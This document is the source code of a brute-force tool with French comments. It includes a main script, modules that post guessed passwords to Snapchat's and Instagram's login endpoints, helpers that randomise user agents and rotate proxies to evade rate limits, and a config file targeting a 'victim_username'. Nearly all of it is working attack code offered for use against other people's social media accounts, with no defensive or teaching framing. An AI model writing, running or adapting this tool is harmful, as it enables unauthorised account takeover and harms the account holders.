brute-force-framework/
│── main.py                # Core du bruteforce (multi-thread)
│── modules/
│   ├── snapchat.py        # Module Snapchat (API reverse-engineered)
│   ├── instagram.py       # Module Instagram (GraphQL + Session Hijacking)
│   ├── facebook.py        # Module Facebook (Login CSRF + Cookies)
│   └── utils.py           # Outils (proxies, delays, headers randomisés)
│── wordlists/
│   ├── passwords.txt      # Dictionnaire de mots de passe
│   └── usernames.txt      # Dictionnaire de noms d'utilisateurs
│── config.json            # Configuration (threads, delays, proxies)
│── requirements.txt       # Dépendances
import asyncio
import random
import json
from modules import snapchat, instagram, facebook
from utils import random_delay, random_user_agent, load_wordlist

class BruteForceFramework:
    def __init__(self, config_path="config.json"):
        self.config = json.load(open(config_path))
        self.targets = self.config.get("targets", [])
        self.threads = self.config.get("threads", 50)
        self.delay = self.config.get("delay", 0.5)
        self.proxies = self.config.get("proxies", [])

    async def attack(self, target):
        platform = target["platform"]
        username = target["username"]
        password_file = target.get("password_file", "wordlists/passwords.txt")

        passwords = load_wordlist(password_file)
        proxy = random.choice(self.proxies) if self.proxies else None

        if platform == "snapchat":
            await snapchat.brute_force(username, passwords, self.threads, self.delay, proxy)
        elif platform == "instagram":
            await instagram.brute_force(username, passwords, self.threads, self.delay, proxy)
        elif platform == "facebook":
            await facebook.brute_force(username, passwords, self.threads, self.delay, proxy)

    def run(self):
        tasks = [self.attack(target) for target in self.targets]
        asyncio.run(asyncio.gather(*tasks))

if __name__ == "__main__":
    bf = BruteForceFramework()
    bf.run()
import aiohttp
import asyncio
from utils import random_delay, random_user_agent

async def brute_force(username, passwords, threads, delay, proxy):
    url = "https://auth.snapchat.com/account/login"
    headers = {"User-Agent": random_user_agent(), "Content-Type": "application/x-www-form-urlencoded"}

    async with aiohttp.ClientSession() as session:
        for password in passwords:
            data = f"login_identifier={username}&password={password}&device_id=random_device_id"
            try:
                async with session.post(url, data=data, headers=headers, proxy=proxy) as resp:
                    if "auth_token" in await resp.text():
                        print(f"[SUCCESS] Snapchat - {username}:{password}")
                        return
            except Exception as e:
                pass
            await asyncio.sleep(delay)
import aiohttp
import asyncio
from utils import random_delay, random_user_agent

async def brute_force(username, passwords, threads, delay, proxy):
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {"User-Agent": random_user_agent(), "X-Requested-With": "XMLHttpRequest"}

    async with aiohttp.ClientSession() as session:
        for password in passwords:
            payload = {
                "username": username,
                "password": password,
                "queryParams": {},
                "device_id": "random_device_id"
            }
            try:
                async with session.post(url, json=payload, headers=headers, proxy=proxy) as resp:
                    if "authenticated" in await resp.text():
                        print(f"[SUCCESS] Instagram - {username}:{password}")
                        return
            except Exception as e:
                pass
            await asyncio.sleep(delay)
import random
import time
from pathlib import Path

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

def random_delay(min_delay=0.1, max_delay=2.0):
    time.sleep(random.uniform(min_delay, max_delay))

def random_user_agent():
    return random.choice(USER_AGENTS)

def load_wordlist(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f]
{
    "targets": [
        {
            "platform": "snapchat",
            "username": "victim_username",
            "password_file": "wordlists/passwords.txt"
        },
        {
            "platform": "instagram",
            "username": "victim_username",
            "password_file": "wordlists/passwords.txt"
        }
    ],
    "threads": 100,
    "delay": 0.3,
    "proxies": ["http://proxy1:port", "http://proxy2:port"]
}
aiohttp==3.8.1
asyncio==3.4.3
